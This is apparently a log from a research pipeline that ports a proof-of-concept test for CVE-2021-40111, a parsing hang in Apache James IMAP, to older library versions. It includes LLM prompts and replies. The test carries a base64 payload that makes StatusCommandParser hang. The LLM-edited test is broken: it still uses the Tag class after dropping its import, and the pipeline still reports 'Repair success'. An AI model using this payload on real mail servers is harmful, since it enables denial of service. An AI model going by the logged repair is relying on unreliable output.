Running main_process.py for CVE: CVE-2021-40111
Versions: 3.4.0

[1m[Main] === Starting adaptation process for CVE-2021-40111 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/org_apache_james_protocols_protocols-imap.txt[0m
[96m[Analyzer] org.apache.james.protocols:protocols-imap has 22 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['1.6.3', '3.0.0-beta5', '3.0.0-RC1', '3.0.0', '3.0.1', '3.1.0', '3.2.0', '3.3.0', '3.4.0'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2021-40111[0m
[92m[Main] Total affected versions: 11[0m
[92m[Main] Already reproduced versions: 2[0m
[93m[Main] Versions pending adaptation: 9[0m
[96m[Main]     -> ['1.6.3', '3.0.0-beta5', '3.0.0-RC1', '3.0.0', '3.0.1', '3.1.0', '3.2.0', '3.3.0', '3.4.0'][0m
[96m[Main]     -> ['3.5.0', '3.6.0'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2021-40111/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 3.4.0[0m
[96m[Selector] Closest reproduced version: 3.5.0 at index 9[0m
[96m[Adapter] Trying next closest version: 3.4.0[0m
[96m[Preparer] Using exploit from origin: /PoCAdaptation/exploit/origin/CVE-2021-40111/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit[0m
[96m[Preparer] Updating dependency version to 3.4.0 in /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 3.4.0 in /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 3.4.0...[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 3.5.0 to 3.4.0...[0m
[96m[Adapter] Start adapting exploit from 3.5.0 to 3.4.0"[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.api[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.decode[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2394 (prompt), 1 (completion), 2395 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol
  symbol:   class Tag
  location: package org.apache.james.imap.api
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol
  symbol:   class DecodingException
  location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[INFO] 7 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.122 s
[INFO] Finished at: 2025-07-13T15:38:17Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: package org.apache.james.imap.api
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 136 (prompt), 10 (completion), 146 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, package org.apache.james.imap.api 

The test executes as expected in 3.5.0 

Error code: import org.apache.james.imap.api.Tag; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.api.Tag;Tag
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 9, 'column': 33, 'message': 'cannot find symbol', 'symbol': 'class Tag', 'location': 'package org.apache.james.imap.api', 'code_line': 'import org.apache.james.imap.api.Tag;'} with cause: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[Adapter] Related diffs for error: [(4962, 8.0), (4990, 8.0), (4991, 8.0), (4997, 8.0), (4998, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class Tag cause: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[RepairModule] Trying best diff #4962 with score 8.00[0m
[96m[RepairModule] Iteration 0, temperature 1.000: Trying diff #4962 with score 8.00[0m
[LLMClient] Tokens used: 1018 (prompt), 458 (completion), 1476 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class Tag, location: package org.apache.james.imap.api

### Error Position:
import org.apache.james.imap.api.Tag;

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/decode/ImapRequestLineReader.java, Hunk: @@ -28,24 +28,24 @@
 import java.nio.charset.CharsetDecoder;
 import java.nio.charset.CoderResult;
 import java.nio.charset.CodingErrorAction;
-import java.time.LocalDateTime;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;

 import javax.mail.Flags;

-import org.apache.commons.io.IOUtils;
 import org.apache.james.imap.api.ImapConstants;
+import org.apache.james.imap.api.display.CharsetUtil;
-import org.apache.james.imap.api.Tag;
 import org.apache.james.imap.api.display.HumanReadableText;
-import org.apache.james.imap.api.display.ModifiedUtf7;
 import org.apache.james.imap.api.message.IdRange;
 import org.apache.james.imap.api.message.UidRange;
 import org.apache.james.imap.api.message.request.DayMonthYear;
 import org.apache.james.imap.api.process.ImapSession;
 import org.apache.james.imap.api.process.SearchResUtil;
-import org.apache.james.imap.utils.FastByteArrayOutputStream;
 import org.apache.james.mailbox.MessageUid;
+import org.apache.james.protocols.imap.DecodingException;
+import org.apache.james.protocols.imap.utils.DecoderUtils;
+import org.apache.james.protocols.imap.utils.FastByteArrayOutputStream;

 /**
  * Wraps the client input reader with a bunch of convenience methods, allowing

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.api.Tag;
import org.apache.james.imap.decode.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}


[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class DecodingException', 'cannot find symbol | class Tag'}
[RepairModule] New grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class Tag'}
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #4962 at iteration 0![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1788 (prompt), 1 (completion), 1789 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[INFO] 3 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.411 s
[INFO] Finished at: 2025-07-13T15:38:57Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,61] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,59] cannot find symbol
[ERROR]   symbol:   class Tag
